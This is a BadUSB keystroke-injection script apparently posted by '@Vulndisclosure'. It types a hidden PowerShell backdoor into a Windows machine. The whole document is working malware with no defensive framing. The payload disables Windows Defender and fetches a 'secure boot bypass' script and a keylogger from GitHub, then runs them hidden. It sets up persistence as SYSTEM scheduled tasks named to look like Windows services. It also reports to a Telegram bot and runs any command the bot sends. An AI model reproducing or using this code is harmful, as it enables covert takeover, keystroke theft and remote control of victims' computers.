#by @Vulndisclosure
DELAY 1000
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
ENTER
DELAY 2000
STRING $token='BOT_TOKEN';$chatId='CHAT_ID';$ErrorActionPreference='SilentlyContinue';$scriptUrl='https://raw.githubusercontent.com/Sashka220/Bad_usb_secboot_bypass/main/secure_boot_bypass.ps1';$keyloggerUrl='https://raw.githubusercontent.com/Sashka220/Bad_usb_secboot_bypass/main/keyloger_module.ps1';$scriptPath='$env:TEMP\secure_boot_bypass.ps1';$keyloggerPath='$env:TEMP\keyloger_module.ps1';function Test-Admin{([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)};function Disable-Defender{try{Set-MpPreference -DisableRealtimeMonitoring 1 -DisableBehaviorMonitoring 1 -DisableBlockAtFirstSeen 1 -DisableIOAVProtection 1 -DisablePrivacyMode 1 -DisableScriptScanning 1 -DisableArchiveScanning 1 -DisableIntrusionPreventionSystem 1 -DisableEmailScanning 1;Stop-Service -Name WinDefend -Force;Set-Service -Name WinDefend -StartupType Disabled;'Defender disabled'}catch{'Defender disable failed'}};function Get-SystemInfo{$os=(Get-WmiObject Win32_OperatingSystem).Caption;$cpu=(Get-WmiObject Win32_Processor).Name;$ram=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2);$av=Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct | %{$_.displayName};return "System activated\nOS: $os\nCPU: $cpu\nRAM: $ram GB\nAV: $($av -join ', ')"};function Download-And-Patch-SecureBootScript{try{$scriptContent=(New-Object System.Net.WebClient).DownloadString($scriptUrl);$patchedScript=$scriptContent -replace 'param\(\s*\[string\]\$Token\s*=\s*"[^"]*"',"param(`[string`]`$Token=`"$token`"" -replace '\[string\]\$ChatId\s*=\s*"[^"]*"',"[string]`$ChatId=`"$chatId`"";Out-File -FilePath $scriptPath -InputObject $patchedScript -Encoding UTF8;'Script downloaded and patched'}catch{'Download/Patch failed: '+$_.Exception.Message}};function Download-And-Patch-Keylogger{try{$keyloggerContent=(New-Object System.Net.WebClient).DownloadString($keyloggerUrl);$patchedKeylogger=$keyloggerContent -replace 'BOT_TOKEN',$token -replace 'CHAT_ID',$chatId;Out-File -FilePath $keyloggerPath -InputObject $patchedKeylogger -Encoding UTF8;'Keylogger downloaded and patched'}catch{'Keylogger download/patch failed: '+$_.Exception.Message}};function Invoke-SecureBootScript{try{Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -WindowStyle Hidden;'Script executed'}catch{'Execution failed'}};function Start-Keylogger{try{Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$keyloggerPath`"" -WindowStyle Hidden;'Keylogger started'}catch{'Keylogger start failed'}};function Add-Persistence{$taskAction=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"";$taskTrigger=New-ScheduledTaskTrigger -AtLogOn;$taskPrincipal=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;$taskSettings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;$task=New-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings;Register-ScheduledTask -TaskName 'WindowsUpdateService' -InputObject $task -Force;$keyloggerAction=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`"";$keyloggerTask=New-ScheduledTask -Action $keyloggerAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings;Register-ScheduledTask -TaskName 'SystemInputMonitor' -InputObject $keyloggerTask -Force};function Invoke-CommandHandler{[CmdletBinding()]param([string]$Command);try{$output=Invoke-Expression $Command 2>&1 | Out-String;if([string]::IsNullOrWhiteSpace($output)){$output='Command executed (no output)'};Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body @{chat_id=$chatId;text="[CMD] $Command`nOutput: $output"} -ErrorAction Stop}catch{$errMsg=$_.Exception.Message;Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body @{chat_id=$chatId;text="[CMD-ERROR] $Command`nError: $errMsg"}}};function Send-TelegramLog{param([string]$Message);try{Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body @{chat_id=$chatId;text=$Message} -ErrorAction Stop}catch{}};$offset=0;if(Test-Admin){Send-TelegramLog '[INIT] Running with administrator privileges';$defenderStatus=Disable-Defender;Send-TelegramLog "[DEFENDER] $defenderStatus";$downloadStatus=Download-And-Patch-SecureBootScript;Send-TelegramLog "[DOWNLOAD] $downloadStatus";$keyloggerStatus=Download-And-Patch-Keylogger;Send-TelegramLog "[KEYLOGGER] $keyloggerStatus";$executionStatus=Invoke-SecureBootScript;Send-TelegramLog "[EXECUTION] $executionStatus";$keyloggerStart=Start-Keylogger;Send-TelegramLog "[KEYLOGGER-START] $keyloggerStart";Add-Persistence;Start-Sleep 3;$sysInfo=Get-SystemInfo;Send-TelegramLog "Backdoor activated with persistence and keylogger`n$sysInfo"}else{Send-TelegramLog '[INIT] Administrator privileges required - exiting'};while($true){try{$updates=Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/getUpdates?offset=$(($offset+1))&timeout=10" -Method Get -ErrorAction Stop;foreach($update in $updates.result){$offset=$update.update_id;if($update.message.text){$msg=$update.message.text;switch($msg){'/status'{Send-TelegramLog '[STATUS] System online'};'/info'{$sysInfo=Get-SystemInfo;Send-TelegramLog "[INFO] $sysInfo"};'/defender'{Send-TelegramLog "[DEFENDER] $(Disable-Defender)"};'/deploy'{Send-TelegramLog "[DEPLOY] $(Download-And-Patch-SecureBootScript)`n$(Invoke-SecureBootScript)"};'/keylogger'{Send-TelegramLog "[KEYLOGGER] $(Download-And-Patch-Keylogger)`n$(Start-Keylogger)"};'/reboot'{Restart-Computer -Force};default{Invoke-CommandHandler -Command $msg}}}}}catch{Start-Sleep 2};Start-Sleep 2}
ENTER
